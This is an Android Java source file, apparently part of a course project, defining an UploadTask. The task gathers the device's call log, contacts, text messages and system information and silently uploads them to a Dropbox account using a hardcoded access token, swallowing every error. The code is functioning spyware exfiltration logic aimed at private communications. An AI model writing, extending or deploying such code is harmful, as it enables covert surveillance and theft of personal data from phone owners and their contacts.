package yalimov.course.network;

import android.os.AsyncTask;

import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;

import yalimov.course.collectors.CallsCollector;
import yalimov.course.collectors.ContactCollector;
import yalimov.course.collectors.MessagesCollector;
import yalimov.course.collectors.SystemCollector;

import static yalimov.course.Common.DBX_ACCESS_TOKEN;


public class UploadTask extends AsyncTask<String, Void, FileMetadata>
{

    private Exception mException;
    private DbxClientV2 client;
    private String result;

    public interface Callback
    {
        void onUploadComplete(FileMetadata result);
        void onError(Exception e);
    }

    UploadTask()
    {

    }

    @Override
    protected FileMetadata doInBackground(String... params)
    {
        try
        {
            DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/mobile_2").build();
            client = new DbxClientV2(config, DBX_ACCESS_TOKEN);

            InputStream CallsInfo    = new ByteArrayInputStream(CallsCollector.getCallsLog().getBytes(StandardCharsets.UTF_8));
            InputStream ContactInfo  = new ByteArrayInputStream(ContactCollector.getContactsLog().getBytes(StandardCharsets.UTF_8));
            InputStream MessagesInfo = new ByteArrayInputStream(MessagesCollector.getMessagesLog().getBytes(StandardCharsets.UTF_8));
            InputStream SystemInfo   = new ByteArrayInputStream(SystemCollector.getSystemLog().getBytes(StandardCharsets.UTF_8));

            client.files().uploadBuilder("/CallsLog.txt").uploadAndFinish(CallsInfo);
            client.files().uploadBuilder("/ContactsLog.txt").uploadAndFinish(ContactInfo);
            client.files().uploadBuilder("/MessagesLog.txt").uploadAndFinish(MessagesInfo);
            client.files().uploadBuilder("/SystemLog.txt").uploadAndFinish(SystemInfo);
        }
        catch (Exception ex)
        {

        }
        return null;
    }
}
